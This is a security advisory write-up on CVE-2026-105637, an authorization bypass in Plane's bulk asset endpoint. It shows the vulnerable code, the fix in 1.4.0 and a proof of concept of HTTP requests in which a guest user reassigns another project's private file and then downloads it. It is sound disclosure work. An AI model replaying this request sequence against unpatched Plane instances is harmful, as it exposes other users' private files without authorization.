# CVE-2026-105637: Cross-project asset hijacking in Plane, the sibling endpoint two CVEs left behind

**Published:** 2026-10-05 **Reported:** 2026-05-23 **Severity:** 9.6 Critical **Status:** Fixed in Plane 1.4.0 (GHSA-r2hw-fff3-pjwp) **CWE:** CWE-639 (Authorization Bypass Through User-Controlled Key)

---

Plane's `ProjectBulkAssetEndpoint` looks up the file assets it is about to reassign by workspace and by caller-supplied UUIDs, and never by the project in the URL. The permission decorator checks that the caller has at least GUEST on the URL project, which the attacker satisfies with a project they created themselves. A workspace GUEST posts another project's asset UUID to their own project's bulk route, the asset's `project_id` and `issue_id` are rewritten to the attacker's, and Plane then hands them a presigned S3 URL for a file they were refused thirty seconds earlier. Two prior CVEs patched this exact bug class on neighbouring endpoints. This one was not in either patch set.

---

## Background

Plane had already shipped two fixes for this shape by the time I looked.

CVE-2026-27705 patched `ProjectAssetEndpoint.patch`, the single-asset update route. CVE-2026-46558 (GHSA-grcw-rwjr-ww79, published 2026-05-15) patched `WorkspaceFileAssetEndpoint` and `DuplicateAssetEndpoint`. The reporter of that second one wrote something worth quoting, as Mitigation #6:

> Review other V2 asset flows for the same pattern. ... A full audit of all asset routes is recommended.

That recommendation was not acted on. So the useful question was not "does Plane have an asset IDOR" but "which `FileAsset.objects.filter(...)` call sites still select rows by caller-supplied UUIDs without re-scoping to the URL project". Mapping every call site in `apps/api/plane/app/views/asset/v2.py` surfaces one that the two patches never touched, and it happens to be the one that writes.

## The bug

`apps/api/plane/app/views/asset/v2.py`, in `ProjectBulkAssetEndpoint.post` as it stood on v1.3.1:

```python
@allow_permission([ROLE.ADMIN, ROLE.MEMBER, ROLE.GUEST])
def post(self, request, slug, project_id, entity_id):
    asset_ids = request.data.get("asset_ids", [])
    if not asset_ids:
        return Response({"error": "No asset ids provided."}, status=status.HTTP_400_BAD_REQUEST)

    # the only scope is workspace + caller-supplied IDs
    assets = FileAsset.objects.filter(id__in=asset_ids, workspace__slug=slug)

    asset = assets.first()
    if not asset:
        return Response({"error": "The requested asset could not be found."}, status=status.HTTP_404_NOT_FOUND)

    if asset.entity_type == FileAsset.EntityTypeContext.ISSUE_DESCRIPTION:
        try:
            assets.update(issue_id=entity_id, project_id=project_id)
        except IntegrityError:
            pass
    ...
```

Two independent things have to line up for this to be exploitable, and both do.

The queryset is scoped to `workspace__slug` and the UUIDs from the request body. `project_id` is a function parameter, available and unused in the lookup. Any asset anywhere in the workspace matches if the caller knows its UUID.

The `@allow_permission([ADMIN, MEMBER, GUEST])` decorator does its job correctly, and that is the part worth sitting with. It verifies the caller holds at least GUEST on the URL's `project_id`. It has no opinion about the assets, because it cannot have one: it never sees `asset_ids`. The attacker supplies a `project_id` they are ADMIN of, because they created that project themselves, and the gate opens. The check and the data it is supposed to protect are scoped to two different things.

Then `assets.update(...)` writes. Not a read leak, a write, on rows the caller has no access to.

The branch taken depends on `entity_type`, and each one rewrites a different foreign key:

| `entity_type` | field reassigned | effect |
|---|---|---|
| `PROJECT_COVER` | `project_id`, `cover_image_asset_id` | victim project's cover taken over |
| `ISSUE_DESCRIPTION` | `issue_id`, `project_id` | victim's private issue uploads land in the attacker's issue |
| `COMMENT_DESCRIPTION` | `comment_id` | victim's comment attachments retargeted |
| `PAGE_DESCRIPTION` | `page_id` | victim's page attachments retargeted |
| `DRAFT_ISSUE_DESCRIPTION` | `draft_issue_id` | victim's draft uploads retargeted |

Reassignment alone would be an integrity bug. What turns it into disclosure is that the read endpoints trust the row. `WorkspaceFileAssetEndpoint.get` filters on `workspace__slug` only, and `ProjectAssetEndpoint.get` matches on the new `project_id`, which is now the attacker's. The file follows its foreign key into the attacker's project, and the normal download flow does the rest.

## PoC

Plane CE v1.2.3 from the official `deployments/cli/community/docker-compose.yml`. One shared workspace. Bob is ADMIN of project `PVA` with `secret_roadmap.pdf` attached to one of his issues. Alice is a workspace GUEST with her own project `PAT` and an empty issue, and she is not a member of `PVA`.

**Step 1.** Alice asks for Bob's asset directly, through Bob's project, to establish the baseline:

```console
GET /api/assets/v2/workspaces/shared-ws/projects/d086b5cf-d7b2-44be-9726-07c98f0a6229/087f535a-933e-43b7-b579-c0392e03c841/
Cookie: session-id=<alice>

HTTP/1.1 403 Forbidden
{"error":"You don't have the required permissions."}
```

Refused, correctly. Alice is not a member of that project.

**Step 2.** Alice posts the same asset UUID to the bulk route on **her own** project and **her own** issue:

```console
POST /api/assets/v2/workspaces/shared-ws/projects/93842268-d2ac-4844-9f96-9c182eb7119d/63b776f8-9c7f-409b-b3ad-8bfc36ef431f/bulk/
Cookie: session-id=<alice>
X-Csrftoken: <alice csrf>
Content-Type: application/json

{"asset_ids": ["087f535a-933e-43b7-b579-c0392e03c841"]}

HTTP/1.1 204 No Content
```

**Step 3.** The row moved:

```
asset 087f535a-933e-43b7-b579-c0392e03c841
  before:  project_id=d086b5cf... (Bob's PVA)    issue_id=f52237b9... (Bob's issue)
  after:   project_id=93842268... (Alice's PAT)  issue_id=63b776f8... (Alice's issue)
```

**Step 4.** Alice repeats the request from step 1, changing only the project in the path to her own:

```console
GET /api/assets/v2/workspaces/shared-ws/projects/93842268-d2ac-4844-9f96-9c182eb7119d/087f535a-933e-43b7-b579-c0392e03c841/
Cookie: session-id=<alice>

HTTP/1.1 302 Found
Location: http://localhost:18080/uploads/eb01f709-.../25e50f902e8b4d93bc8d7ec9840dddab-secret_roadmap.pdf?<presigned signature>
```

The presigned URL is signed by the storage backend and honoured by any HTTP client, so Plane's authorization layer is out of the loop from here on. Same asset, same user, 403 in step 1 and a download credential in step 4. The only thing that changed between them is one `POST`.

## Impact

A workspace GUEST, Plane's lowest role, acting entirely inside endpoints they are authorized to call, can read any other project's private file assets by reassigning them into a project they control and then triggering the ordinary presigned-URL flow. They can also strip a victim project of its cover, attachments or page assets, replace a project cover with content of their choosing, and relocate any uploaded file reachable through the entity types above. The victim's file leaves their project and does not come back on its own.

The attacker needs the asset UUIDs. Those are not secret in practice. They appear in shared issue links and embeds, since markdown rendering inlines `<img src="/api/assets/v2/.../<uuid>">`. They also appear in workspace asset listings, exports, printable views, and referrer headers from ordinary intra-workspace navigation.

**CVSS 3.1:** 9.6 Critical, `AV:N/AC:L/PR:L/UI:N/S:C/C:H/I:H/A:N`. `S:C` is the metric doing the work here: the vulnerable component is one project's authorization boundary and the impacted component is another's, so scope changes. Worth noting that I proposed this vector in the report but scored it 8.7, which was my arithmetic error. GitHub scored the same vector correctly at 9.6 on publication.

Affected: Plane `<= 1.3.1`, confirmed exploited end to end on v1.2.3, same code present on v1.3.1 and on `preview` HEAD `039d582`.

## Fix

The obvious patch is to add the missing filter, and that is what I suggested in the report:

```python
assets = FileAsset.objects.filter(
    id__in=asset_ids,
    workspace__slug=slug,
    project_id=project_id,   # add this
)
```

That turns out to be wrong, in an interesting way. This endpoint exists to *associate* freshly uploaded assets, and a freshly uploaded asset is not project-scoped yet. A cover image uploaded during project creation has `project_id=NULL` until this very call sets it. Filtering on `project_id=project_id` returns nothing for that row, the endpoint 404s, and project creation breaks.

The patch in 1.4.0 solves the authorization problem without that regression, by scoping on ownership instead of location:

```python
assets = FileAsset.objects.filter(
    id__in=asset_ids,
    workspace__slug=slug,
    created_by=request.user,
).filter(Q(project_id=project_id) | Q(project_id__isnull=True))
```

A caller can now only touch assets they uploaded themselves, and only those that are either already in this project or not yet attached to any project. Alice cannot name Bob's asset because Bob uploaded it, and she cannot pull in an asset from a third project because its `project_id` is neither hers nor null. The legitimate "attach my new upload" flow still works because `project_id IS NULL` is permitted. `@allow_permission` continues to handle the project side.

Fixed in Plane 1.4.0, released 2026-07-31.

## Disclosure

| Date         | Event                                                      |
|--------------|-------------------------------------------------------------|
| 2026-05-21   | Variant sweep of the v2 asset routes against `preview` HEAD `039d582` |
| 2026-05-23   | Exploited end to end on CE v1.2.3, reported via GitHub Security Advisory |
| 2026-07-31   | Fix ships in Plane 1.4.0                                    |
| 2026-08-03   | GHSA-r2hw-fff3-pjwp published, CVE-2026-105637 assigned     |

Thanks to the Plane team, who took the report, and who caught that my suggested filter would have broken project creation.

## Takeaways

The reporter of CVE-2026-46558 told the maintainers where to look next, in the advisory itself, and the follow-up audit did not happen. That is not unusual. A patch closes the endpoint in the report because that is the endpoint with a working PoC attached, and the sentence recommending a wider sweep carries no PoC and no ticket. It reads as advice rather than as work.

Which makes a published advisory's own mitigation notes a reasonable place to start a variant hunt. The reporter has already done the hard part, naming the pattern and the file it lives in. Checking whether anyone acted on it costs one afternoon of reading call sites.

The second thing is that `@allow_permission` here is not a broken check. It answers the question it was asked, about the caller's role on the URL project, and it answers it correctly. The bug is that nothing asks the other question, about whether the objects in the request body belong to that project. A decorator that reads the URL cannot validate a request body it never sees, and an endpoint that takes object IDs from the body needs its own scoping in the queryset. Those two live in different places in the code, which is exactly why the gap is easy to miss and keeps recurring on a new endpoint each time.

## Links

- Advisory: https://github.com/makeplane/plane/security/advisories/GHSA-r2hw-fff3-pjwp
- CVE record: https://www.cve.org/CVERecord?id=CVE-2026-105637
- Parent advisory (CVE-2026-46558): https://github.com/makeplane/plane/security/advisories/GHSA-grcw-rwjr-ww79
- Plane: https://github.com/makeplane/plane
- CWE-639: https://cwe.mitre.org/data/definitions/639.html
